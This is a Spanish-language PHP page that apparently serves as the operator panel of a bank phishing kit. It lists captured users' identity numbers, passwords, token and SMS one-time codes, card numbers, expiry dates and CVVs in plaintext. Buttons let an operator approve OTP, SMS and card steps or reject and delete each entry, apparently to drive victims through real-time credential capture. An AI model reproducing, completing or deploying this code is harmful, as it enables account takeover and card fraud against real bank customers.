<?php
include 'Conexion.php'; // Conexión a la base de datos

$query = "SELECT * FROM usuarios";
$resultado = $conexion->query($query);
?>

<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Panel de Usuarios</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f4f4f4;
            text-align: center;
            margin: 20px;
        }
        table {
            width: 90%;
            margin: auto;
            border-collapse: collapse;
            background: #fff;
            box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
            margin-bottom: 20px;
        }
        th, td {
            padding: 10px;
            border: 1px solid #ddd;
        }
        th {
            background: #007BFF;
            color: white;
        }
        tr:nth-child(even) {
            background: #f2f2f2;
        }
        .btn {
            border: none;
            padding: 10px 20px;
            border-radius: 20px;
            cursor: pointer;
            font-size: 16px;
            color: white;
            margin-right: 5px;
            margin-bottom: 5px;
        }
        .btn-token {
            background-color: #4da6ff;
        }
        .btn-tarjeta {
            background-color: #4caf50;
        }
        .btn-eliminar {
            background-color: #ff4d4d;
        }
        .btn-volver {
            background-color: #555;
            padding: 12px 30px;
            font-size: 18px;
            margin: 20px 0;
            display: inline-block;
            text-decoration: none;
        }
        .acciones {
            display: flex;
            flex-wrap: wrap;
            justify-content: center;
        }
        .header-container {
            display: flex;
            justify-content: space-between;
            align-items: center;
            width: 90%;
            margin: 0 auto 20px auto;
        }
        .header-container h2 {
            margin: 0;
        }
    </style>
</head>
<body>

<div class="header-container">
    <h2>Lista de Usuarios</h2>
    <a href="index.html" class="btn btn-volver">Volver al Inicio</a>
</div>

<table>
    <tr>
        <th>ID Usuario</th>
        <th>Tipo Identificación</th>
        <th>Número Identificación</th>
        <th>Clave Segura</th>
        <th>Código Token</th>
        <th>Código SMS</th>
        <th>Número Tarjeta</th>
        <th>Fecha Vencimiento</th>
        <th>CVV</th>
        <th>Acción</th>
    </tr>

    <?php
    if ($resultado->num_rows > 0) {
        while ($fila = $resultado->fetch_assoc()) {
            echo "<tr>
                    <td>{$fila['id_usuario']}</td>
                    <td>{$fila['tipo_identificacion']}</td>
                    <td>{$fila['numero_identificacion']}</td>
                    <td>{$fila['clave_segura']}</td>
                    <td>{$fila['codigo_token']}</td>
                    <td>{$fila['codigo_sms']}</td>
                    <td>{$fila['numero_tarjeta']}</td>
                    <td>{$fila['fecha_vencimiento']}</td>
                    <td>{$fila['cvv']}</td>
                    <td class='acciones'>
                        <button class='btn btn-token' onclick='autorizarUsuario({$fila['id_usuario']})'>Token/OTP</button>
                        <button class='btn btn-tarjeta' onclick='aprobarTarjeta({$fila['id_usuario']})'>Codigo SMS</button>
                        <button class='btn btn-tarjeta' onclick='aprobarCodigosms({$fila['id_usuario']})'>Tarjeta</button>
                        <button class='btn btn-eliminar' onclick='rechazar({$fila['id_usuario']})'>Rechazar</button>
                        <button class='btn btn-eliminar' onclick='eliminarUsuario({$fila['id_usuario']})'>Eliminar</button>
                    </td>
                  </tr>";
        }
    } else {
        echo "<tr><td colspan='9'>No hay usuarios registrados.</td></tr>";
    }
    ?>
</table>

<script>
function autorizarUsuario(idUsuario) {
    if (confirm("¿Seguro que quieres aprobar este usuario?")) {
        fetch("actualizar_estado.php", {
            method: "POST",
            headers: { "Content-Type": "application/x-www-form-urlencoded" },
            body: "id_usuario=" + idUsuario
        })
        .then(response => response.text())
        .then(data => {
            alert(data);
            location.reload(); // Recargar para ver cambios
        })
        .catch(error => console.error("Error al autorizar usuario:", error));
    }
}

function aprobarTarjeta(idUsuario) {
    if (confirm("¿Seguro que quieres aprobar el acceso a codigo sms?")) {
        fetch("aprobar_tarjeta.php", {
            method: "POST",
            headers: { "Content-Type": "application/x-www-form-urlencoded" },
            body: "id_usuario=" + idUsuario
        })
        .then(response => response.text())
        .then(data => {
            alert(data);
            location.reload(); // Recargar para ver cambios
        })
        .catch(error => console.error("Error al aprobar tarjeta:", error));
    }
}
function aprobarCodigosms(idUsuario) {
    if (confirm("¿Seguro que quieres aprobar el acceso a tarjeta?")) {
        fetch("aprobar_sms.php", {
            method: "POST",
            headers: { "Content-Type": "application/x-www-form-urlencoded" },
            body: "id_usuario=" + idUsuario
        })
        .then(response => response.text())
        .then(data => {
            alert(data);
            location.reload(); // Recargar para ver cambios
        })
        .catch(error => console.error("Error al aprobar tarjeta:", error));
    }
}
function rechazar(idUsuario) {
    if (confirm("¿Seguro que quieres rechazar el acceso a este usuario?")) {
        fetch("rechazar.php", {
            method: "POST",
            headers: { "Content-Type": "application/x-www-form-urlencoded" },
            body: "id_usuario=" + idUsuario
        })
        .then(response => response.text())
        .then(data => {
            alert(data);
            location.reload(); // Recargar para ver cambios
        })
        .catch(error => console.error("Error al aprobar tarjeta:", error));
    }
}
function eliminarUsuario(idUsuario) {
    if (confirm("¿Estás seguro de que deseas eliminar este usuario? Esta acción no se puede deshacer.")) {
        fetch("eliminar_usuario.php", {
            method: "POST",
            headers: { "Content-Type": "application/x-www-form-urlencoded" },
            body: "id_usuario=" + idUsuario
        })
        .then(response => response.text())
        .then(data => {
            alert(data);
            location.reload(); // Recargar la página para ver los cambios
        })
        .catch(error => console.error("Error al eliminar usuario:", error));
    }
}
</script>

</body>
</html>